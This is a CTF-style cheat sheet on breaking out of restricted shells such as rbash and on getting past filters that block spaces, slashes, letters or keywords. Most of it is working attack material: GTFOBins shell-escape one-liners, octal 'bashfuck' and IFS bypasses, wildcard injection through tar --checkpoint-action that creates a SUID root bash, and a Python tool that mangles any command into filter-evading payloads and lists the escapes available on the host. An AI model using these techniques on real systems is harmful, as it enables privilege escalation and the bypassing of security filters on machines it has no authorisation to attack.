---
title: "Shell Jail Escape - rbash, No-Space, No-Alphanumeric"
category: misc
subcategory: shell-jail
type: technique
tags: [rbash, restricted-shell, jail-escape, shell-escape, gtfobins, no-space, ifs, brace-expansion, wildcard-injection, tar-checkpoint, bashfuck, no-alphanumeric, path-hijack, bash-cmds, sandbox-escape]
difficulty: medium
summary: "Restricted shells fall to any program that spawns a child; filters on spaces, letters and keywords fall to shell expansion."
when_to_use:
  - "You land in rbash/rksh or a menu shell after SSH or a web RCE"
  - "A filter strips spaces, quotes, slashes or alphanumerics from your command"
  - "sudo -l or a SUID binary lets you run one specific program"
  - "A script runs `tar *` or `chown * ` in a directory you can write to"
tools: [bash, rbash, gtfobins, python3, perl, busybox, socat, vim, awk, find]
related: [linux-privesc, gtfobins-quickref, jail-escape-payloads, python-jail-escape, container-escape, ctf-general-cheatsheet]
---

## TL;DR

A restricted shell restricts *the shell*, not the programs it starts. Find any binary that can
run a child process or execute a script - `vi`, `less`, `man`, `awk`, `find`, `python`, `perl`,
`tar` - and you are out. Character filters fall to `${IFS}`, brace expansion, variable slicing
and `$'\x..'`.

## Recognise it

```bash
# what am I in?
echo $SHELL; echo $0; echo $BASH_VERSION
# rbash tells on itself
cd /            # "rbash: cd: restricted"
export PATH=/bin  # "rbash: PATH: readonly variable"
ls /bin           # may be empty -> PATH is pinned to a tiny directory
compgen -c | sort -u | head -50   # every command name you can run
echo $PATH; ls -la $(echo $PATH | tr ':' ' ') 2>/dev/null
```

`rbash` (bash `-r` / `--restricted`) blocks: `cd`, setting or unsetting `PATH`/`SHELL`/
`ENV`/`BASH_ENV`, command names containing `/`, redirection (`>`, `>>`, `<>`, `>&`, `&>`),
`exec`, `enable -f`, `command -p`, and `set +r`. It does **not** block: shell functions,
variable expansion, any binary on `PATH` that itself spawns a shell, or `bash` invoked by name.

## Attack

### 1. Inventory

```bash
compgen -c | sort -u                    # every executable name in PATH plus builtins
compgen -b                              # builtins
compgen -A function                     # functions the profile defined
echo /usr/bin/*                         # glob works even when ls is missing
help                                    # builtin list
type -a bash sh python perl awk find vi less more man ed
sudo -l                                 # what can you run as someone else
```

### 2. Escape via a child process (GTFOBins territory)

```bash
# editors
vi -c ':!/bin/sh' /dev/null
vim -c ':!/bin/sh'
# from inside vi/vim:  :!/bin/sh   or   :set shell=/bin/sh   then  :shell
ed
!/bin/sh

# pagers (they run $SHELL on '!')
less /etc/passwd     # then type: !/bin/sh
man man              # then type: !/bin/sh
more /etc/passwd     # then: !/bin/sh

# scripting languages
python3 -c 'import os; os.system("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e 'os.execute("/bin/sh")'
node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
php -r "system('/bin/sh');"

# classic unix tools
awk 'BEGIN {system("/bin/sh")}'
find / -maxdepth 0 -exec /bin/sh \;
find . -exec /bin/sh \; -quit
nmap --interactive            # very old versions only: then !sh
git help status               # opens a pager -> !/bin/sh
git -p help                   # same
ftp
!/bin/sh
gdb -nx -ex '!sh' -ex quit
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/x.zip /etc/hostname -T -TT 'sh #'
socat file:`tty`,raw,echo=0 exec:'/bin/sh',pty,stderr
busybox sh
env /bin/sh
script -q /dev/null /bin/sh
```

### 3. Escape rbash specifically

```bash
# start an unrestricted shell by name
bash
sh
bash --noprofile --norc
# rbash only restricts the CURRENT shell; a new bash is unrestricted unless it is also -r
# spawn through a command that takes a shell argument
BASH_CMDS[x]=/bin/sh; x                  # BASH_CMDS is the hash table; adding an entry
                                         # gives you a command that is not PATH-restricted
export -f f 2>/dev/null                  # exported functions survive into child shells
# escape the PATH pin by using a full path INSIDE a program that allows it
python3 -c 'import subprocess;subprocess.call("/bin/bash")'
# ssh's ProxyCommand / LocalCommand runs a shell
ssh -o ProxyCommand='/bin/sh -i 2>&0' x@127.0.0.1
ssh localhost -t "/bin/sh"
# scp/rsync -e
rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

After escaping, fix your environment:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'   # get a real pty
# then Ctrl-Z, `stty raw -echo; fg`, then `reset`
```

### 4. No spaces

```bash
cat${IFS}/etc/passwd          # IFS defaults to space/tab/newline
cat${IFS}$9/etc/passwd        # $9 is empty, separates ${IFS} from the next char
cat$IFS/etc/passwd
{cat,/etc/passwd}             # brace expansion inserts a space
cat</etc/passwd               # redirection needs no space
X=$'\x20';cat${X}/etc/passwd  # build a literal space
cat$'\x20'/etc/passwd
echo${IFS}hello
IFS=,;`cat,/etc/passwd`       # rebind IFS then use a comma
```

### 5. No slashes

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd    # if HOME=/root, ${HOME:0:1} is '/'
cat ${PWD:0:1}etc${PWD:0:1}passwd
cd etc; cat passwd                     # relative paths need no leading slash
echo . | tr '.' '/'
X=$(echo / ); cat ${X}etc${X}passwd
```

### 6. No alphanumerics ("bashfuck")

Bash can build any string from `$`, `{`, `}`, `#`, `?`, `!`, `@`, `\`, `'`, `"`, `(`, `)`,
`[`, `]`, `<`, `>`, `-`, `+`, `_`, `;` and `/`:

```bash
# $# is 0, ${##} is "0", $? is the exit status
echo $#                    # 0
echo ${##}                 # 0  (length of $#, i.e. 1) -- careful, ${##} is 1
# octal escapes give any character
echo $'\163\150'           # sh
$'\163\150'                # runs sh
# $0 is the shell's name; ${0:0:1} slices it
echo ${0}                  # -bash or bash
# combine: build 'sh' from character codes, then execute it
__=$'\163';___=$'\150';$__$___
# the general pattern: a variable holding the string, then $VAR to execute
_=$'\x2f\x62\x69\x6e\x2f\x73\x68';$_
```

The practical recipe: express the command as octal or hex escapes inside `$'...'` and assign
it to a variable whose name is made of `_`, then execute `$_`.

### 7. Blacklisted words

```bash
# quoting splits the token for a naive grep but not for bash
c'a't /etc/passwd
c"a"t /etc/passwd
ca\t /etc/passwd
/bi''n/ca''t /etc/passwd
# variable indirection
a=c;b=at;$a$b /etc/passwd
# reverse it
$(rev<<<'tac')                # 'cat'
echo 'dmFyaWFibGU=' | base64 -d
# wildcards match the binary without naming it
/???/c?t /etc/passwd
/bin/c?t /e*c/pa??wd
/usr/bin/w*i          # matches whoami (and possibly others)
# $@ and "" are removed by the shell but break a literal match
ca""t /etc/passwd
w$@hoami
# $IFS-joined
a=$'\x63\x61\x74';$a /etc/passwd
```

### 8. Wildcard injection

When a script runs `tar *`, `chown *`, `rsync *` or `chmod *` in a directory you can write to,
filenames become **arguments**:

```bash
# tar: --checkpoint-action runs a command
cd /writable/dir
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > exploit.sh
chmod +x exploit.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh exploit.sh'
# when the cron job runs `tar cf backup.tar *`, exploit.sh runs as its user

# chown/chmod: --reference makes them copy another file's ownership/mode
touch -- '--reference=/etc/shadow'
# then `chown -R user *` gives every file shadow's owner

# rsync: -e runs a remote shell command
touch -- '-e sh exploit.sh'

# 7z: a file named @listfile makes it read that file as a list, leaking contents
touch @flag.txt; ln -s /root/flag.txt flag.txt
```

## Code

```python
#!/usr/bin/env python3
"""Shell payload transformer: remove spaces, remove alphanumerics, evade word blacklists.

  python3 shellmangle.py nospace "cat /etc/passwd"
  python3 shellmangle.py noalnum "cat /etc/passwd"
  python3 shellmangle.py blacklist "cat /etc/passwd" cat passwd
  python3 shellmangle.py --selftest
"""
from __future__ import annotations

import shlex
import subprocess
import sys


def no_space(cmd: str, style: str = "ifs") -> str:
    """Rewrite a command so it contains no literal space character."""
    parts = cmd.split(" ")
    if style == "ifs":
        return "${IFS}".join(parts)
    if style == "brace":
        return "{" + ",".join(parts) + "}"
    if style == "tab":
        return "\t".join(parts)
    if style == "hex":
        # a literal space built in a variable; ${X} is unquoted so word splitting applies
        return "X=$'\\x20';" + "${X}".join(parts)
    raise ValueError(style)


def no_slash(cmd: str) -> str:
    """Replace '/' with ${PWD:0:1} (valid whenever the cwd is absolute)."""
    return cmd.replace("/", "${PWD:0:1}")


def no_alnum(cmd: str) -> str:
    """Build the command as an octal-escaped string in a variable named with underscores."""
    escaped = "".join(f"\\{b:03o}" for b in cmd.encode())
    return f"__=$'{escaped}';$__"


def no_alnum_eval(cmd: str) -> str:
    """Variant that feeds the reconstructed string back to the shell (handles arguments)."""
    escaped = "".join(f"\\{b:03o}" for b in cmd.encode())
    return f"___=$'{escaped}';eval \"$___\""


def evade_words(cmd: str, words: list[str]) -> list[str]:
    """Several spellings of cmd that a naive substring blacklist will not match."""
    out: list[str] = []

    quoted = cmd
    for w in words:
        if len(w) >= 2 and w in quoted:
            quoted = quoted.replace(w, w[0] + "''" + w[1:], 1)
    out.append(quoted)

    backslashed = cmd
    for w in words:
        if len(w) >= 2 and w in backslashed:
            backslashed = backslashed.replace(w, w[0] + "\\" + w[1:], 1)
    out.append(backslashed)

    at = cmd
    for w in words:
        if len(w) >= 2 and w in at:
            at = at.replace(w, w[0] + "$@" + w[1:], 1)
    out.append(at)

    # wildcard form: replace interior characters of each blacklisted word with ?
    wild = cmd
    for w in words:
        if len(w) >= 3 and w in wild:
            wild = wild.replace(w, w[0] + "?" * (len(w) - 2) + w[-1], 1)
    out.append(wild)

    # variable assembly (single-word commands)
    tokens = cmd.split(" ")
    if tokens:
        head = tokens[0]
        asm = ";".join(f"_{i}={c}" for i, c in enumerate(head)) + ";"
        asm += "".join(f"${{_{i}}}" for i in range(len(head)))
        if len(tokens) > 1:
            asm += " " + " ".join(tokens[1:])
        out.append(asm)

    out.append(no_alnum(cmd))
    return out


def runs_ok(snippet: str, timeout: int = 10) -> tuple[bool, str]:
    """Execute a snippet under bash and return (success, output). Used by the self-test."""
    try:
        p = subprocess.run(["bash", "-c", snippet], capture_output=True, timeout=timeout)
    except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
        return False, f"{exc}"
    return p.returncode == 0, (p.stdout + p.stderr).decode("utf-8", "replace")


ESCAPE_ONE_LINERS = [
    ("vi", "vi -c ':!/bin/sh' /dev/null"),
    ("less", "less /etc/passwd    # then: !/bin/sh"),
    ("man", "man man             # then: !/bin/sh"),
    ("awk", "awk 'BEGIN {system(\"/bin/sh\")}'"),
    ("find", "find / -maxdepth 0 -exec /bin/sh \\;"),
    ("python3", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"),
    ("perl", "perl -e 'exec \"/bin/sh\";'"),
    ("tar", "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"),
    ("zip", "zip /tmp/x.zip /etc/hostname -T -TT 'sh #'"),
    ("socat", "socat file:`tty`,raw,echo=0 exec:'/bin/sh',pty,stderr"),
    ("busybox", "busybox sh"),
    ("env", "env /bin/sh"),
    ("script", "script -q /dev/null /bin/sh"),
    ("ssh", "ssh -o ProxyCommand='/bin/sh -i 2>&0' x@127.0.0.1"),
    ("gdb", "gdb -nx -ex '!sh' -ex quit"),
    ("bash", "BASH_CMDS[x]=/bin/sh; x"),
]


def available_escapes() -> list[tuple[str, str]]:
    """Which of the known escapes are actually installed on this host."""
    out = []
    for binary, payload in ESCAPE_ONE_LINERS:
        p = subprocess.run(["bash", "-c", f"command -v {shlex.quote(binary)}"],
                           capture_output=True)
        if p.returncode == 0:
            out.append((binary, payload))
    return out


def main() -> int:
    if len(sys.argv) < 2 or sys.argv[1] == "--selftest":
        _selftest()
        return 0
    cmd = sys.argv[1]
    if cmd == "nospace":
        for style in ("ifs", "brace", "hex", "tab"):
            print(f"{style:<6} {no_space(sys.argv[2], style)}")
    elif cmd == "noalnum":
        print(no_alnum(sys.argv[2]))
        print(no_alnum_eval(sys.argv[2]))
    elif cmd == "noslash":
        print(no_slash(sys.argv[2]))
    elif cmd == "blacklist":
        for v in evade_words(sys.argv[2], sys.argv[3:]):
            print(v)
    elif cmd == "escapes":
        for b, p in available_escapes():
            print(f"{b:<10} {p}")
    else:
        print(__doc__)
        return 1
    return 0


def _selftest() -> None:
    target = "echo hello"

    # no-space transforms still run and still produce the same output
    for style in ("ifs", "brace", "hex", "tab"):
        snippet = no_space(target, style)
        assert " " not in snippet or style == "tab", (style, snippet)
        ok, out = runs_ok(snippet)
        if ok:
            assert "hello" in out, (style, out)

    # no-alnum transform contains no ASCII letters or digits outside the escape syntax
    payload = no_alnum("echo hi")
    body = payload.split("$'", 1)[1].split("'", 1)[0]
    assert all(c in "\\01234567" for c in body), body
    ok, out = runs_ok(payload)
    if ok:
        assert "hi" in out, out

    # blacklist evasion keeps the command working while breaking a substring match
    variants = evade_words("echo hello", ["echo", "hello"])
    assert len(variants) >= 5
    working = 0
    for v in variants:
        ok, out = runs_ok(v)
        if ok and "hello" in out:
            working += 1
    assert working >= 2, [runs_ok(v) for v in variants]
    assert any("echo" not in v for v in variants), variants

    # no-slash transform
    ns = no_slash("cat /etc/hostname")
    assert "/" not in ns.replace("${PWD:0:1}", ""), ns

    print(f"selftest ok: no-space x4, no-alnum runs, {working} blacklist variants work, no-slash")


if __name__ == "__main__":
    sys.exit(main())
```

## Variants and pitfalls

- **`rbash` restricts only the current shell.** Typing `bash` usually gives you a normal shell
  unless the admin also pinned `SHELL` and removed every other interpreter.
- **`PATH` is read-only in rbash**, but `BASH_CMDS[x]=/bin/sh` inserts an entry into bash's
  command hash table and bypasses the "no `/` in command names" rule.
- **No `/` allowed in command names** is the rule that makes rbash annoying; every escape above
  either uses a bare name or passes the path as an *argument*, which is allowed.
- **`sudo -l` is free.** A single `NOPASSWD` entry on any GTFOBins binary ends the challenge.
- **Wildcard injection needs the script to use `*` unquoted.** `tar cf x.tar "$@"` is safe;
  `tar cf x.tar *` is not.
- **`${IFS}` is empty in some shells** (dash sets IFS but `$IFS` may expand to nothing when
  unset). `${IFS}` works in bash; `$'\x20'` and `{a,b}` are more portable.
- **`$'...'` is a bash/zsh feature**, not POSIX. In dash use `printf` or `echo -e`.
- **Brace expansion `{cat,/etc/passwd}`** happens before word splitting, so it survives filters
  that strip spaces after parsing.
- **Filters that reject the whole line on a match** are easier than filters that strip
  characters: stripping can be abused (`ccatat` -> strip `cat` once -> `cat`).
- **Check for a pty.** Many escapes give you a non-interactive shell; upgrade with
  `python3 -c 'import pty;pty.spawn("/bin/bash")'` then `stty raw -echo; fg`.
- **Logging**: `~/.bash_history` and auditd may record you. In a CTF nobody cares; on a real
  engagement it matters.

## Tools

`compgen`/`type`/`help` (enumeration), GTFOBins (https://gtfobins.github.io/) for the
per-binary escape, `busybox`, `socat`, `script`, `python3` for pty upgrades, `pspy` to watch
for the cron job you are about to wildcard-inject.

## References

- Bash manual, "The Restricted Shell" - the authoritative list of what rbash blocks:
  https://www.gnu.org/software/bash/manual/bash.html
- GTFOBins - per-binary shell/file-read/file-write/sudo/suid payloads:
  https://gtfobins.github.io/
- GNU tar manual for `--checkpoint` and `--checkpoint-action=exec=`.
